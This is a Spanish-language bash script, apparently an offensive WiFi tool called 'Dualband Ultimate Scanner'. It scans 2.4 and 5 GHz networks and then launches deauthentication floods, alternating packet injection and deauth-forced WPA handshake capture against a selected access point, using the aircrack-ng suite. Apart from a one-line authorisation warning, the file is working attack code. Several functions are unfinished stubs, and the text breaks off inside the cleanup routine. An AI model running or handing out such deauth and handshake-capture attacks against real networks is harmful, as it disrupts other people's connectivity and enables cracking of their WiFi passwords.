#!/bin/bash

# 📡 DUALBAND ULTIMATE SCANNER
# Operación en 2.4GHz y 5GHz con inyección simultánea

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables globales
INTERFACE_24=""
INTERFACE_5=""
BAND_24_ACTIVE=""
BAND_5_ACTIVE=""
TARGET_BSSID_24=""
TARGET_BSSID_5=""
TARGET_ESSID=""
ATTACK_TYPE=""
OUTPUT_DIR=""

print_banner() {
    clear
    echo -e "${BLUE}"
    echo "██████╗ ██╗   ██╗ █████╗ ██╗     ██████╗  █████╗ ███╗   ██╗██████╗     ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗"
    echo "██╔══██╗██║   ██║██╔══██╗██║     ██╔══██╗██╔══██╗████╗  ██║██╔══██╗    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝"
    echo "██║  ██║██║   ██║███████║██║     ██████╔╝███████║██╔██╗ ██║██║  ██║    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  "
    echo "██║  ██║██║   ██║██╔══██║██║     ██╔══██╗██╔══██║██║╚██╗██║██║  ██║    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  "
    echo "██████╔╝╚██████╔╝██║  ██║███████╗██████╔╝██║  ██║██║ ╚████║██████╔╝    ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗"
    echo "╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝      ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝"
    echo -e "${NC}"
    echo -e "${CYAN}📡 Dualband Ultimate - 2.4GHz + 5GHz Simultáneo${NC}"
    echo -e "${YELLOW}⚠️  Solo usar en redes propias o con autorización${NC}"
    echo ""
}

detect_wifi_interfaces() {
    echo -e "${YELLOW}🔍 Detectando interfaces WiFi...${NC}"
    
    # Obtener todas las interfaces WiFi
    local wifi_interfaces=($(iwconfig 2>/dev/null | grep -E "^[a-z].*IEEE 802.11" | cut -d' ' -f1))
    
    if [[ ${#wifi_interfaces[@]} -eq 0 ]]; then
        echo -e "${RED}❌ No se detectaron interfaces WiFi${NC}"
        return 1
    fi
    
    echo -e "${CYAN}📡 Interfaces WiFi detectadas:${NC}"
    
    # Mostrar interfaces y sus capacidades
    for i in "${!wifi_interfaces[@]}"; do
        local iface="${wifi_interfaces[$i]}"
        local mode=$(iwconfig "$iface" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
        
        # Detectar bandas soportadas
        local bands=""
        if iw dev "$iface" info 2>/dev/null | grep -q "2412\|2437\|2462"; then
            bands="${bands}2.4GHz "
        fi
        if iw dev "$iface" info 2>/dev/null | grep -q "5180\|5200\|5220"; then
            bands="${bands}5GHz "
        fi
        if [[ -z "$bands" ]]; then
            # Verificación alternativa
            local wiphy=$(iw dev "$iface" info 2>/dev/null | grep wiphy | awk '{print $2}')
            if [[ -n "$wiphy" ]]; then
                bands=$(iw phy "phy$wiphy" info 2>/dev/null | grep -E "24[0-9][0-9] MHz|5[0-9][0-9][0-9] MHz" | head -1)
                [[ -n "$bands" ]] && bands="Detección automática" || bands="Desconocido"
            fi
        fi
        
        echo -e "  ${CYAN}$((i+1)).${NC} $iface (Modo: $mode, Bandas: ${bands:-Desconocido})"
    done
    
    # Seleccionar interfaces
    echo -e "\n${YELLOW}Configuración de interfaces:${NC}"
    
    # Interface para 2.4GHz
    read -p "🔵 Selecciona interface para 2.4GHz (1-${#wifi_interfaces[@]}): " iface_24_choice
    if [[ "$iface_24_choice" -ge 1 && "$iface_24_choice" -le ${#wifi_interfaces[@]} ]]; then
        INTERFACE_24="${wifi_interfaces[$((iface_24_choice-1))]}"
    else
        INTERFACE_24="${wifi_interfaces[0]}"
    fi
    
    # Interface para 5GHz (puede ser la misma)
    echo -e "${BLUE}¿Usar interface separada para 5GHz?${NC}"
    echo -e "  ${CYAN}1.${NC} Sí, seleccionar otra interface"
    echo -e "  ${CYAN}2.${NC} No, usar la misma (${INTERFACE_24})"
    
    read -p "Opción (1-2): " separate_interface
    
    if [[ "$separate_interface" == "1" ]]; then
        read -p "🔴 Selecciona interface para 5GHz (1-${#wifi_interfaces[@]}): " iface_5_choice
        if [[ "$iface_5_choice" -ge 1 && "$iface_5_choice" -le ${#wifi_interfaces[@]} ]]; then
            INTERFACE_5="${wifi_interfaces[$((iface_5_choice-1))]}"
        else
            INTERFACE_5="${wifi_interfaces[0]}"
        fi
    else
        INTERFACE_5="$INTERFACE_24"
    fi
    
    echo -e "${GREEN}✅ Interfaces configuradas:${NC}"
    echo -e "  🔵 2.4GHz: ${CYAN}$INTERFACE_24${NC}"
    echo -e "  🔴 5GHz: ${CYAN}$INTERFACE_5${NC}"
    
    # Configurar modo monitor
    setup_monitor_mode
}

setup_monitor_mode() {
    echo -e "\n${CYAN}🔧 Configurando modo monitor...${NC}"
    
    # Configurar interface 2.4GHz
    if [[ -n "$INTERFACE_24" ]]; then
        echo -e "🔵 Configurando $INTERFACE_24 para 2.4GHz..."
        
        sudo airmon-ng stop "$INTERFACE_24" 2>/dev/null
        sudo airmon-ng start "$INTERFACE_24" 2>/dev/null
        
        # Buscar nueva interface monitor
        local monitor_24=$(iwconfig 2>/dev/null | grep -E "Mode:Monitor" | grep "${INTERFACE_24}" | cut -d' ' -f1)
        if [[ -z "$monitor_24" ]]; then
            monitor_24="${INTERFACE_24}mon"
        fi
        
        if iwconfig "$monitor_24" >/dev/null 2>&1; then
            INTERFACE_24="$monitor_24"
            echo -e "${GREEN}✅ $INTERFACE_24 en modo monitor${NC}"
        else
            echo -e "${RED}❌ Error configurando $INTERFACE_24${NC}"
        fi
    fi
    
    # Configurar interface 5GHz si es diferente
    if [[ -n "$INTERFACE_5" && "$INTERFACE_5" != "$INTERFACE_24" ]]; then
        echo -e "🔴 Configurando $INTERFACE_5 para 5GHz..."
        
        sudo airmon-ng stop "$INTERFACE_5" 2>/dev/null
        sudo airmon-ng start "$INTERFACE_5" 2>/dev/null
        
        # Buscar nueva interface monitor
        local monitor_5=$(iwconfig 2>/dev/null | grep -E "Mode:Monitor" | grep "${INTERFACE_5}" | cut -d' ' -f1)
        if [[ -z "$monitor_5" ]]; then
            monitor_5="${INTERFACE_5}mon"
        fi
        
        if iwconfig "$monitor_5" >/dev/null 2>&1; then
            INTERFACE_5="$monitor_5"
            echo -e "${GREEN}✅ $INTERFACE_5 en modo monitor${NC}"
        else
            echo -e "${RED}❌ Error configurando $INTERFACE_5${NC}"
        fi
    fi
}

scan_dualband_networks() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}       ${YELLOW}ESCANEO DUALBAND COMPLETO${NC}       ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    local scan_24_file="/tmp/scan_24ghz_$(date +%H%M%S)"
    local scan_5_file="/tmp/scan_5ghz_$(date +%H%M%S)"
    
    echo -e "${CYAN}📡 Escaneando ambas bandas simultáneamente...${NC}"
    echo -e "${YELLOW}⏳ Presiona Ctrl+C después de 30 segundos${NC}"
    
    # Escanear 2.4GHz
    if [[ -n "$INTERFACE_24" ]]; then
        echo -e "🔵 Iniciando scan 2.4GHz en $INTERFACE_24..."
        # Fijar canales 2.4GHz (1-11)
        sudo iwconfig "$INTERFACE_24" channel 6 2>/dev/null
        timeout 30 sudo airodump-ng "$INTERFACE_24" --band bg --write "$scan_24_file" --output-format csv 2>/dev/null &
        local scan_24_pid=$!
    fi
    
    # Escanear 5GHz (si es interface diferente)
    if [[ -n "$INTERFACE_5" && "$INTERFACE_5" != "$INTERFACE_24" ]]; then
        echo -e "🔴 Iniciando scan 5GHz en $INTERFACE_5..."
        # Fijar canal 5GHz (36, 40, 44, etc.)
        sudo iwconfig "$INTERFACE_5" channel 36 2>/dev/null
        timeout 30 sudo airodump-ng "$INTERFACE_5" --band a --write "$scan_5_file" --output-format csv 2>/dev/null &
        local scan_5_pid=$!
    elif [[ "$INTERFACE_5" == "$INTERFACE_24" ]]; then
        # Misma interface: escanear 5GHz después de 2.4GHz
        wait $scan_24_pid
        echo -e "🔴 Cambiando a scan 5GHz..."
        sudo iwconfig "$INTERFACE_24" channel 36 2>/dev/null
        timeout 30 sudo airodump-ng "$INTERFACE_24" --band a --write "$scan_5_file" --output-format csv 2>/dev/null || true
    fi
    
    # Esperar a que terminen los scans
    wait 2>/dev/null || true
    
    # Procesar resultados
    process_dualband_results "$scan_24_file" "$scan_5_file"
    
    # Limpiar archivos temporales
    rm -f "$scan_24_file"* "$scan_5_file"* 2>/dev/null
}

process_dualband_results() {
    local scan_24="$1"
    local scan_5="$2"
    
    echo -e "\n${GREEN}📊 Resultados del escaneo dualband:${NC}"
    
    # Procesar 2.4GHz
    echo -e "\n🔵 ${CYAN}REDES 2.4GHz:${NC}"
    echo -e "${BLUE}ID  BSSID             ESSID                    CH  PWR  ENC${NC}"
    echo -e "${BLUE}──  ─────────────────  ───────────────────────  ──  ───  ───${NC}"
    
    local counter_24=1
    declare -A networks_24_map
    
    if [[ -f "$scan_24-01.csv" ]]; then
        while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key_type; do
            if [[ -n "$bssid" && "$bssid" != "BSSID" && "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ && -n "$essid" ]]; then
                printf "${CYAN}%2d${NC}  %-17s  %-23s  %2s  %3s  %3s\n" "$counter_24" "$bssid" "$essid" "$channel" "$power" "$privacy"
                networks_24_map["$counter_24"]="$bssid|$essid|$channel|2.4GHz"
                ((counter_24++))
            fi
        done < "$scan_24-01.csv"
    fi
    
    [[ $counter_24 -eq 1 ]] && echo -e "  ${YELLOW}No se encontraron redes 2.4GHz${NC}"
    
    # Procesar 5GHz
    echo -e "\n🔴 ${CYAN}REDES 5GHz:${NC}"
    echo -e "${BLUE}ID  BSSID             ESSID                    CH  PWR  ENC${NC}"
    echo -e "${BLUE}──  ─────────────────  ───────────────────────  ──  ───  ───${NC}"
    
    local counter_5=1
    declare -A networks_5_map
    
    if [[ -f "$scan_5-01.csv" ]]; then
        while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key_type; do
            if [[ -n "$bssid" && "$bssid" != "BSSID" && "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ && -n "$essid" ]]; then
                printf "${CYAN}%2d${NC}  %-17s  %-23s  %2s  %3s  %3s\n" "$counter_5" "$bssid" "$essid" "$channel" "$power" "$privacy"
                networks_5_map["$counter_5"]="$bssid|$essid|$channel|5GHz"
                ((counter_5++))
            fi
        done < "$scan_5-01.csv"
    fi
    
    [[ $counter_5 -eq 1 ]] && echo -e "  ${YELLOW}No se encontraron redes 5GHz${NC}"
    
    # Detectar redes dualband (mismo ESSID en ambas bandas)
    echo -e "\n🎯 ${CYAN}ANÁLISIS DUALBAND:${NC}"
    detect_dualband_networks
    
    # Selección de objetivo
    select_dualband_target "$counter_24" "$counter_5"
}

detect_dualband_networks() {
    echo -e "Buscando redes que operan en ambas bandas..."
    
    # Comparar ESSIDs para encontrar dualband
    local dualband_found=false
    
    # Esta función requeriría lógica más compleja para comparar los arrays
    # Por simplicidad, mostramos un mensaje informativo
    echo -e "${BLUE}💡 Verifica manualmente si algún ESSID aparece en ambas listas${NC}"
    echo -e "${BLUE}   Las redes dualband tendrán el mismo nombre pero diferentes BSSIDs${NC}"
}

select_dualband_target() {
    local max_24="$1"
    local max_5="$2"
    
    echo -e "\n${YELLOW}🎯 Selección de objetivo dualband:${NC}"
    echo -e "  ${CYAN}1.${NC} Solo 2.4GHz"
    echo -e "  ${CYAN}2.${NC} Solo 5GHz"  
    echo -e "  ${CYAN}3.${NC} Ambas bandas (dualband)"
    echo -e "  ${CYAN}4.${NC} ESSID personalizado"
    echo ""
    
    read -p "Selecciona modo de ataque (1-4): " mode_choice
    
    case $mode_choice in
        1)
            echo -e "🔵 Modo: Solo 2.4GHz"
            read -p "ID de red 2.4GHz (1-$((max_24-1))): " target_24
            # Aquí se configuraría TARGET_BSSID_24 basado en networks_24_map
            BAND_24_ACTIVE="true"
            BAND_5_ACTIVE="false"
            ;;
        2)
            echo -e "🔴 Modo: Solo 5GHz"
            read -p "ID de red 5GHz (1-$((max_5-1))): " target_5
            # Aquí se configuraría TARGET_BSSID_5 basado en networks_5_map
            BAND_24_ACTIVE="false"
            BAND_5_ACTIVE="true"
            ;;
        3)
            echo -e "🎯 Modo: Ataque dualband"
            read -p "ID de red 2.4GHz (1-$((max_24-1))): " target_24
            read -p "ID de red 5GHz (1-$((max_5-1))): " target_5
            BAND_24_ACTIVE="true"
            BAND_5_ACTIVE="true"
            ;;
        4)
            read -p "📝 ESSID del objetivo: " TARGET_ESSID
            echo -e "${YELLOW}Se atacarán todas las bandas de: $TARGET_ESSID${NC}"
            BAND_24_ACTIVE="true"
            BAND_5_ACTIVE="true"
            ;;
        *)
            echo -e "${YELLOW}Usando modo solo 2.4GHz por defecto${NC}"
            BAND_24_ACTIVE="true"
            BAND_5_ACTIVE="false"
            ;;
    esac
}

select_dualband_attack() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}        ${YELLOW}TIPO DE ATAQUE DUALBAND${NC}        ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué ataque dualband quieres ejecutar?${NC}"
    echo -e "  ${CYAN}1.${NC} 🎯 Deauth simultáneo 2.4GHz + 5GHz"
    echo -e "  ${CYAN}2.${NC} 📡 Monitor de banda dual"
    echo -e "  ${CYAN}3.${NC} 🔄 Inyección coordinada"
    echo -e "  ${CYAN}4.${NC} 📊 Análisis comparativo de bandas"
    echo -e "  ${CYAN}5.${NC} 🎣 Captura de handshakes dual"
    echo -e "  ${CYAN}6.${NC} ⚙️ Configuración personalizada"
    echo ""
    
    read -p "Selecciona ataque (1-6): " attack_choice
    
    case $attack_choice in
        1)
            ATTACK_TYPE="dual_deauth"
            echo -e "${GREEN}✅ Deauth simultáneo en ambas bandas${NC}"
            ;;
        2)
            ATTACK_TYPE="dual_monitor"
            echo -e "${GREEN}✅ Monitor de banda dual${NC}"
            ;;
        3)
            ATTACK_TYPE="coordinated_injection"
            echo -e "${GREEN}✅ Inyección coordinada${NC}"
            ;;
        4)
            ATTACK_TYPE="band_analysis"
            echo -e "${GREEN}✅ Análisis comparativo${NC}"
            ;;
        5)
            ATTACK_TYPE="dual_handshake"
            echo -e "${GREEN}✅ Captura de handshakes dual${NC}"
            ;;
        6)
            select_custom_dualband_config
            ;;
        *)
            echo -e "${YELLOW}Usando deauth dual por defecto${NC}"
            ATTACK_TYPE="dual_deauth"
            ;;
    esac
}

select_custom_dualband_config() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}     ${YELLOW}CONFIGURACIÓN DUALBAND CUSTOM${NC}     ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}Configuración avanzada dualband:${NC}"
    
    # Configuración temporal
    echo -e "\n${CYAN}⏱️ Configuración temporal:${NC}"
    read -p "🔄 Alternar entre bandas cada X segundos (default 30): " band_rotation
    band_rotation=${band_rotation:-30}
    
    read -p "⏱️ Duración total del ataque (minutos, default 10): " total_duration
    total_duration=${total_duration:-10}
    
    # Configuración de intensidad
    echo -e "\n${CYAN}🔥 Configuración de intensidad:${NC}"
    read -p "📦 Paquetes por segundo 2.4GHz (default 10): " packets_24
    packets_24=${packets_24:-10}
    
    read -p "📦 Paquetes por segundo 5GHz (default 15): " packets_5
    packets_5=${packets_5:-15}
    
    # Configuración de coordinación
    echo -e "\n${CYAN}🎯 Coordinación entre bandas:${NC}"
    read -p "🔄 Sincronizar ataques? (Y/n): " sync_attacks
    sync_attacks=${sync_attacks:-y}
    
    read -p "📊 Análisis en tiempo real? (Y/n): " realtime_analysis
    realtime_analysis=${realtime_analysis:-y}
    
    ATTACK_TYPE="custom_dual"
    
    # Guardar configuración
    cat > "/tmp/dualband_custom_config" << EOF
BAND_ROTATION=$band_rotation
TOTAL_DURATION=$((total_duration * 60))
PACKETS_24=$packets_24
PACKETS_5=$packets_5
SYNC_ATTACKS=$sync_attacks
REALTIME_ANALYSIS=$realtime_analysis
EOF
    
    echo -e "${GREEN}✅ Configuración dualband personalizada guardada${NC}"
}

setup_output_directory() {
    OUTPUT_DIR="dualband_attack_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"/{logs,captures,analysis,configs}
    mkdir -p "$OUTPUT_DIR/logs"/{24ghz,5ghz}
    mkdir -p "$OUTPUT_DIR/captures"/{24ghz,5ghz}
    
    echo -e "${GREEN}📁 Directorio creado: $OUTPUT_DIR${NC}"
    
    # Crear archivo de información
    cat > "$OUTPUT_DIR/attack_info.txt" << EOF
# Dualband Attack Info - $(date)
Interface 2.4GHz: $INTERFACE_24
Interface 5GHz: $INTERFACE_5
Target BSSID 2.4GHz: $TARGET_BSSID_24
Target BSSID 5GHz: $TARGET_BSSID_5
Target ESSID: $TARGET_ESSID
Attack Type: $ATTACK_TYPE
Band 2.4GHz Active: $BAND_24_ACTIVE
Band 5GHz Active: $BAND_5_ACTIVE
Started: $(date)
EOF
}

execute_dual_deauth() {
    echo -e "\n${YELLOW}🎯 Ejecutando deauth simultáneo en ambas bandas...${NC}"
    
    local pids=()
    
    # Deauth en 2.4GHz
    if [[ "$BAND_24_ACTIVE" == "true" && -n "$INTERFACE_24" ]]; then
        echo -e "🔵 Iniciando deauth 2.4GHz..."
        
        local deauth_24_cmd="aireplay-ng --deauth 0"
        [[ -n "$TARGET_BSSID_24" ]] && deauth_24_cmd="$deauth_24_cmd -a $TARGET_BSSID_24"
        deauth_24_cmd="$deauth_24_cmd $INTERFACE_24"
        
        sudo $deauth_24_cmd 2>&1 | tee "$OUTPUT_DIR/logs/24ghz/deauth.log" &
        pids+=($!)
    fi
    
    # Deauth en 5GHz
    if [[ "$BAND_5_ACTIVE" == "true" && -n "$INTERFACE_5" ]]; then
        echo -e "🔴 Iniciando deauth 5GHz..."
        
        local deauth_5_cmd="aireplay-ng --deauth 0"
        [[ -n "$TARGET_BSSID_5" ]] && deauth_5_cmd="$deauth_5_cmd -a $TARGET_BSSID_5"
        deauth_5_cmd="$deauth_5_cmd $INTERFACE_5"
        
        sudo $deauth_5_cmd 2>&1 | tee "$OUTPUT_DIR/logs/5ghz/deauth.log" &
        pids+=($!)
    fi
    
    echo -e "${GREEN}🎯 Deauth dualband activo en ${#pids[@]} banda(s)${NC}"
    echo -e "${YELLOW}⏳ Presiona Ctrl+C para detener...${NC}"
    
    # Monitor de efectividad
    monitor_dual_effectiveness &
    local monitor_pid=$!
    
    # Esperar interrupción
    trap "cleanup_dual_processes ${pids[@]} $monitor_pid" INT
    wait
}

execute_dual_monitor() {
    echo -e "\n${YELLOW}📡 Iniciando monitor de banda dual...${NC}"
    
    local pids=()
    
    # Monitor 2.4GHz
    if [[ "$BAND_24_ACTIVE" == "true" && -n "$INTERFACE_24" ]]; then
        echo -e "🔵 Iniciando monitor 2.4GHz..."
        
        sudo airodump-ng "$INTERFACE_24" --band bg \
            --write "$OUTPUT_DIR/captures/24ghz/monitor" \
            --output-format pcap,csv,kismet \
            2>&1 | tee "$OUTPUT_DIR/logs/24ghz/monitor.log" &
        pids+=($!)
    fi
    
    # Monitor 5GHz
    if [[ "$BAND_5_ACTIVE" == "true" && -n "$INTERFACE_5" ]]; then
        echo -e "🔴 Iniciando monitor 5GHz..."
        
        sudo airodump-ng "$INTERFACE_5" --band a \
            --write "$OUTPUT_DIR/captures/5ghz/monitor" \
            --output-format pcap,csv,kismet \
            2>&1 | tee "$OUTPUT_DIR/logs/5ghz/monitor.log" &
        pids+=($!)
    fi
    
    echo -e "${GREEN}📡 Monitor dualband activo${NC}"
    echo -e "${YELLOW}⏳ Capturando tráfico (Ctrl+C para detener)...${NC}"
    
    # Análisis en tiempo real
    analyze_dual_traffic &
    local analysis_pid=$!
    
    # Esperar interrupción
    trap "cleanup_dual_processes ${pids[@]} $analysis_pid" INT
    wait
}

execute_coordinated_injection() {
    echo -e "\n${YELLOW}🔄 Ejecutando inyección coordinada...${NC}"
    
    # Cargar configuración personalizada si existe
    if [[ -f "/tmp/dualband_custom_config" ]]; then
        source "/tmp/dualband_custom_config"
    else
        BAND_ROTATION=30
        PACKETS_24=10
        PACKETS_5=15
        SYNC_ATTACKS="y"
    fi
    
    echo -e "${CYAN}⚙️ Configuración de inyección:${NC}"
    echo -e "  🔄 Rotación de banda: ${CYAN}${BAND_ROTATION}s${NC}"
    echo -e "  📦 Paquetes 2.4GHz: ${CYAN}${PACKETS_24}/s${NC}"
    echo -e "  📦 Paquetes 5GHz: ${CYAN}${PACKETS_5}/s${NC}"
    echo -e "  🎯 Sincronizado: ${CYAN}${SYNC_ATTACKS}${NC}"
    
    local current_band="24"
    local switch_time=$(date +%s)
    local pids=()
    
    while true; do
        local current_time=$(date +%s)
        
        # Verificar si es tiempo de cambiar banda
        if [[ $((current_time - switch_time)) -ge $BAND_ROTATION ]]; then
            echo -e "\n${BLUE}🔄 Cambiando de banda...${NC}"
            
            # Detener procesos actuales
            for pid in "${pids[@]}"; do
                kill "$pid" 2>/dev/null || true
            done
            pids=()
            
            # Alternar banda
            if [[ "$current_band" == "24" ]]; then
                current_band="5"
                echo -e "🔴 Activando inyección 5GHz..."
                execute_injection_5ghz &
                pids+=($!)
            else
                current_band="24"
                echo -e "🔵 Activando inyección 2.4GHz..."
                execute_injection_24ghz &
                pids+=($!)
            fi
            
            switch_time=$current_time
        fi
        
        sleep 5
    done
}

execute_injection_24ghz() {
    if [[ -n "$INTERFACE_24" && -n "$TARGET_BSSID_24" ]]; then
        sudo aireplay-ng --deauth "$PACKETS_24" -a "$TARGET_BSSID_24" "$INTERFACE_24"
    fi
}

execute_injection_5ghz() {
    if [[ -n "$INTERFACE_5" && -n "$TARGET_BSSID_5" ]]; then
        sudo aireplay-ng --deauth "$PACKETS_5" -a "$TARGET_BSSID_5" "$INTERFACE_5"
    fi
}

execute_band_analysis() {
    echo -e "\n${YELLOW}📊 Ejecutando análisis comparativo de bandas...${NC}"
    
    local analysis_file="$OUTPUT_DIR/analysis/band_comparison.txt"
    
    {
        echo "=== DUALBAND ANALYSIS REPORT - $(date) ==="
        echo "Target: $TARGET_ESSID"
        echo "2.4GHz Interface: $INTERFACE_24"
        echo "5GHz Interface: $INTERFACE_5"
        echo ""
        
        # Análisis de canales
        echo "=== CHANNEL ANALYSIS ==="
        analyze_channel_usage
        echo ""
        
        # Análisis de potencia de señal
        echo "=== SIGNAL STRENGTH ANALYSIS ==="
        analyze_signal_strength
        echo ""
        
        # Análisis de congestión
        echo "=== CONGESTION ANALYSIS ==="
        analyze_band_congestion
        
    } | tee "$analysis_file"
    
    echo -e "${GREEN}📊 Análisis completado: $analysis_file${NC}"
}

analyze_channel_usage() {
    echo "Analyzing channel usage patterns..."
    
    # Análisis de canales 2.4GHz
    echo "2.4GHz Channels:"
    if [[ -f "$OUTPUT_DIR/captures/24ghz/monitor-01.csv" ]]; then
        awk -F',' 'NR>1 {if($4 != "") print $4}' "$OUTPUT_DIR/captures/24ghz/monitor-01.csv" | sort | uniq -c | head -10
    else
        echo "No 2.4GHz capture data available"
    fi
    
    # Análisis de canales 5GHz
    echo "5GHz Channels:"
    if [[ -f "$OUTPUT_DIR/captures/5ghz/monitor-01.csv" ]]; then
        awk -F',' 'NR>1 {if($4 != "") print $4}' "$OUTPUT_DIR/captures/5ghz/monitor-01.csv" | sort | uniq -c | head -10
    else
        echo "No 5GHz capture data available"
    fi
}

analyze_signal_strength() {
    echo "Comparing signal strength across bands..."
    
    # Esta función requeriría análisis más detallado de los archivos CSV
    echo "Signal analysis would be performed on captured data"
}

analyze_band_congestion() {
    echo "Analyzing network congestion patterns..."
    
    # Contar redes por banda
    local networks_24=$(awk -F',' 'NR>1 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ {count++} END {print count+0}' "$OUTPUT_DIR/captures/24ghz/monitor-01.csv" 2>/dev/null || echo "0")
    local networks_5=$(awk -F',' 'NR>1 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ {count++} END {print count+0}' "$OUTPUT_DIR/captures/5ghz/monitor-01.csv" 2>/dev/null || echo "0")
    
    echo "Networks detected:"
    echo "  2.4GHz: $networks_24 networks"
    echo "  5GHz: $networks_5 networks"
}

execute_dual_handshake() {
    echo -e "\n${YELLOW}🎣 Capturando handshakes en ambas bandas...${NC}"
    
    local pids=()
    
    # Captura 2.4GHz
    if [[ "$BAND_24_ACTIVE" == "true" && -n "$INTERFACE_24" ]]; then
        echo -e "🔵 Iniciando captura handshake 2.4GHz..."
        
        local capture_24="$OUTPUT_DIR/captures/24ghz/handshake"
        sudo airodump-ng "$INTERFACE_24" --band bg \
            --write "$capture_24" \
            --output-format pcap,csv \
            2>&1 | tee "$OUTPUT_DIR/logs/24ghz/handshake_capture.log" &
        pids+=($!)
        
        # Deauth para forzar handshake en 2.4GHz
        if [[ -n "$TARGET_BSSID_24" ]]; then
            sleep 5
            sudo aireplay-ng --deauth 5 -a "$TARGET_BSSID_24" "$INTERFACE_24" &
        fi
    fi
    
    # Captura 5GHz
    if [[ "$BAND_5_ACTIVE" == "true" && -n "$INTERFACE_5" ]]; then
        echo -e "🔴 Iniciando captura handshake 5GHz..."
        
        local capture_5="$OUTPUT_DIR/captures/5ghz/handshake"
        sudo airodump-ng "$INTERFACE_5" --band a \
            --write "$capture_5" \
            --output-format pcap,csv \
            2>&1 | tee "$OUTPUT_DIR/logs/5ghz/handshake_capture.log" &
        pids+=($!)
        
        # Deauth para forzar handshake en 5GHz
        if [[ -n "$TARGET_BSSID_5" ]]; then
            sleep 5
            sudo aireplay-ng --deauth 5 -a "$TARGET_BSSID_5" "$INTERFACE_5" &
        fi
    fi
    
    echo -e "${GREEN}🎣 Captura de handshakes dualband activa${NC}"
    echo -e "${YELLOW}⏳ Esperando handshakes (Ctrl+C para detener)...${NC}"
    
    # Monitor de handshakes
    monitor_handshakes &
    local monitor_pid=$!
    
    # Esperar interrupción
    trap "cleanup_dual_processes ${pids[@]} $monitor_pid" INT
    wait
}

monitor_dual_effectiveness() {
    while true; do
        sleep 10
        
        echo -e "\n${CYAN}📊 Estado del ataque dualband:${NC}"
        
        # Monitor 2.4GHz
        if [[ "$BAND_24_ACTIVE" == "true" ]]; then
            local deauth_24_count=$(grep -c "ACK" "$OUTPUT_DIR/logs/24ghz/deauth.log" 2>/dev/null || echo "0")
            echo -e "  🔵 2.4GHz - ACKs recibidos: ${CYAN}$deauth_24_count${NC}"
        fi
        
        # Monitor 5GHz
        if [[ "$BAND_5_ACTIVE" == "true" ]]; then
            local deauth_5_count=$(grep -c "ACK" "$OUTPUT_DIR/logs/5ghz/deauth.log" 2>/dev/null || echo "0")
            echo -e "  🔴 5GHz - ACKs recibidos: ${CYAN}$deauth_5_count${NC}"
        fi
    done
}

analyze_dual_traffic() {
    while true; do
        sleep 30
        
        echo -e "\n${CYAN}📈 Análisis de tráfico dualband:${NC}"
        
        # Análizar capturas 2.4GHz
        if [[ -f "$OUTPUT_DIR/captures/24ghz/monitor-01.csv" ]]; then
            local networks_24=$(awk -F',' 'END{print NR-1}' "$OUTPUT_DIR/captures/24ghz/monitor-01.csv" 2>/dev/null || echo "0")
            echo -e "  🔵 Redes 2.4GHz detectadas: ${CYAN}$networks_24${NC}"
        fi
        
        # Análizar capturas 5GHz
        if [[ -f "$OUTPUT_DIR/captures/5ghz/monitor-01.csv" ]]; then
            local networks_5=$(awk -F',' 'END{print NR-1}' "$OUTPUT_DIR/captures/5ghz/monitor-01.csv" 2>/dev/null || echo "0")
            echo -e "  🔴 Redes 5GHz detectadas: ${CYAN}$networks_5${NC}"
        fi
    done
}

monitor_handshakes() {
    while true; do
        sleep 15
        
        # Verificar handshakes en 2.4GHz
        if [[ -f "$OUTPUT_DIR/captures/24ghz/handshake-01.cap" ]]; then
            local handshake_24=$(aircrack-ng "$OUTPUT_DIR/captures/24ghz/handshake-01.cap" 2>/dev/null | grep -c "handshake" || echo "0")
            if [[ $handshake_24 -gt 0 ]]; then
                echo -e "\n${GREEN}🎉 Handshake capturado en 2.4GHz!${NC}"
            fi
        fi
        
        # Verificar handshakes en 5GHz
        if [[ -f "$OUTPUT_DIR/captures/5ghz/handshake-01.cap" ]]; then
            local handshake_5=$(aircrack-ng "$OUTPUT_DIR/captures/5ghz/handshake-01.cap" 2>/dev/null | grep -c "handshake" || echo "0")
            if [[ $handshake_5 -gt 0 ]]; then
                echo -e "\n${GREEN}🎉 Handshake capturado en 5GHz!${NC}"
            fi
        fi
    done
}

cleanup_dual_processes() {
    echo -e "\n${YELLOW}🧹 Deteniendo procesos dualband...${NC}"
    
    # Matar procesos específicos
    for pid in "$@"; do
        if [[ -n "$pid" ]]; then
            kill "$pid" 2>/dev/null || true
        fi
    done
    
    # Matar aircrack-ng suite
    sudo pkill airodump-ng 2>/dev/null || true
    sudo pkill aireplay-ng 2>/dev/null || true
    
